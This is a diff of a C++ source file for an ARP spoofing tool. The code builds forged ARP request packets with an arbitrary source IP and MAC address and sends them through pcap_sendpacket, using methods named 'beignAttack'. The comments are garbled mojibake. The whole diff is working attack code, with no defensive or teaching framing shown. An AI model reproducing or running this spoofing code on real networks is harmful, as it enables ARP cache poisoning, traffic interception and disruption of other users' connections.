@@ -1,17 +1,11 @@
 #include "ArpSpoof.h"
 
-////////////////////////////////////////// public //////////////////////////////////////////
+///////////////////////////////////// public /////////////////////////////////////
 
-ArpSpoof::ArpSpoof()
+ArpSpoof::ArpSpoof(NetworkAdapter &adapter)
 {
-	m_Adapter.GetNetAddrOfRouter((PDWORD)&m_router_ip, m_router_mac); // Â·ÓÉÆ÷µÄ IP ºÍ MAC
-
-	if (!m_Adapter.GetLocalMac(m_local_mac)) // ±¾»ú MAC
-		printf("\nError: cannot get the MAC addr of your PC!");
-
-	m_Adapter.getLocalIpAndMask(&m_local_ip, &m_netmask);
-	m_netaddr = m_local_ip & m_netmask; // ±¾»úËù´¦µÄÍøÂçµØÖ·
-	m_hostsnum = htonl(~m_netmask) - 1; // Ö÷»úÊý
+	adapter.GetLocalMac(m_local_mac);
+	m_adhandle = adapter.getAdapterHandle();
 }
 
 ArpSpoof::~ArpSpoof()
@@ -19,64 +13,60 @@ ArpSpoof::~ArpSpoof()
 
 }
 
-u_int ArpSpoof::getNetAddr()
+void ArpSpoof::beignAttack(uint32_t dst_ip, uint32_t src_ip, uint8_t *src_mac)
 {
-	return m_netaddr;
-}
+	uint8_t packet[sizeof(arp_packet)];
 
-u_int ArpSpoof::getHostsnum()
-{
-	return m_hostsnum;
-}
+	make_arpspoof_packet(packet, dst_ip, src_ip, src_mac);
 
-void ArpSpoof::beignAttack(u_int dst_ip)
-{
-	u_char packet[sizeof(arp_packet)];
-
-	make_arp_packet(packet, m_local_mac, m_router_ip, dst_ip);
-
-	if (pcap_sendpacket(m_Adapter.getAdapterHandle(), packet, sizeof(packet)) < 0)
+	if (pcap_sendpacket(m_adhandle, packet, sizeof(packet)) < 0)
 	{
 		printf("\npacket sending error");
 	}
 }
 
-////////////////////////////////////////// private //////////////////////////////////////////
+void ArpSpoof::beignAttack(uint32_t dst_ip, uint32_t src_ip)
+{
+	uint8_t packet[sizeof(arp_packet)];
 
-void ArpSpoof::make_arp_packet(u_char* packet, u_char* src_mac, u_int src_ip, u_int dst_ip)
+	make_arpspoof_packet(packet, dst_ip, src_ip);
+
+	if (pcap_sendpacket(m_adhandle, packet, sizeof(packet)) < 0)
+	{
+		printf("packet sending error");
+	}
+}
+
+///////////////////////////////////// private /////////////////////////////////////
+
+void ArpSpoof::make_arpspoof_packet(uint8_t *packet, 
+	uint32_t dst_ip, uint32_t src_ip, uint8_t *src_mac)
 {
 	arp_packet arp_pkt;
 
-	// -----------------Ìî³äÒÔÌ«ÍøÊ×²¿-----------------
-	// Ô´ MAC
+	// -----------------å¡«å……ä»¥å¤ªç½‘é¦–éƒ¨-----------------
 	memcpy(arp_pkt.eh.saddr, src_mac, MAC_LEN);
-	// Ä¿±ê MAC µØÖ·Îª¹ã²¥µØÖ· FF-FF-FF-FF-FF-FF
-	memset(arp_pkt.eh.daddr, 0xFF, MAC_LEN);
-	// ÒÔÌ«ÍøÉÏ²ãÐ­ÒéÎª ARP
+	memset(arp_pkt.eh.daddr, 0xFF, MAC_LEN); // Broadcast
 	arp_pkt.eh.prototype = htons(ETHPROTOCAL_ARP);
 
-	// -----------------Ìî³ä ARP Ê×²¿-----------------
-	// Ó²¼þÀàÐÍÎª Ethernet
+	// -----------------å¡«å…… ARP é¦–éƒ¨-----------------
 	arp_pkt.ah.arp_hrd = htons(HARD_ETHERNET);
-	// ARP ÉÏ²ãÐ­ÒéÎª IPv4
 	arp_pkt.ah.arp_pro = htons(ETHPROTOCAL_IPV4);
-	// Ó²¼þµØÖ·³¤¶ÈÎª MAC_LEN
 	arp_pkt.ah.arp_hln = MAC_LEN;
-	// Ð­ÒéµØÖ·³¤¶ÈÎª IP_LEN
 	arp_pkt.ah.arp_pln = IPV4_LEN;
-	// ²Ù×÷Ñ¡Ïî: ARP ÇëÇó
 	arp_pkt.ah.arp_op = htons(ARP_REQUEST);
-	// Ä¿±ê MAC µØÖ·, Ìî³ä0
-	memset(arp_pkt.ah.arp_thaddr, 0, MAC_LEN);
-	// Ä¿±ê IP µØÖ·
-	arp_pkt.ah.arp_tpaddr = dst_ip;
-	// Ô´ MAC µØÖ·
-	memcpy(arp_pkt.ah.arp_shaddr, src_mac, MAC_LEN);
-	// Ô´ IP µØÖ·
-	arp_pkt.ah.arp_spaddr = src_ip;
 
-	memset(arp_pkt.padding, 0xCC, sizeof(arp_pkt.padding));
+	memcpy(arp_pkt.ah.arp_shaddr, src_mac, MAC_LEN);
+	arp_pkt.ah.arp_spaddr = src_ip;
+	memset(arp_pkt.ah.arp_thaddr, 0x00, MAC_LEN);
+	arp_pkt.ah.arp_tpaddr = dst_ip;
+
 	memcpy(packet, &arp_pkt, sizeof(arp_pkt));
 }
 
-///////////////////////////////////////////////////////////////////////////////////////////////
+void ArpSpoof::make_arpspoof_packet(uint8_t *packet, uint32_t dst_ip, uint32_t src_ip)
+{
+	make_arpspoof_packet(packet, dst_ip, src_ip, m_local_mac);
+}
+
+/////////////////////////////////////////////////////////////////////////////////////
